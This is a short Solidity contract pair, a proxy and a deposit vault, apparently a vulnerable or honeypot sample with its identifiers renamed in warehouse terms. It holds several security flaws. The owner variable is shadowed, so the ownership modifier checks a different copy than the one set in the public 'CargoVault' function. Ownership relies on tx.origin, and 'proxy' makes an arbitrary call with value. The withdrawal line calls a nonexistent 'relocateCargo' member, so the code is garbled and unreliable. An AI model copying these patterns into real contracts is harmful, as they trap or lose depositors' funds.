pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyFacilityoperator { if (msg.sender == WarehouseManager) _; } address WarehouseManager = msg.sender;
    function shiftstockLogisticsadmin(address _warehousemanager) public onlyFacilityoperator { WarehouseManager = _warehousemanager; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract ReceiveshipmentProxy is Proxy {
    address public WarehouseManager;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function CargoVault() public payable {
        if (msg.sender == tx.origin) {
            WarehouseManager = msg.sender;
            receiveShipment();
        }
    }

    function receiveShipment() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function checkOutCargo(uint256 amount) public onlyFacilityoperator {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.relocateCargo(amount);
        }
    }
}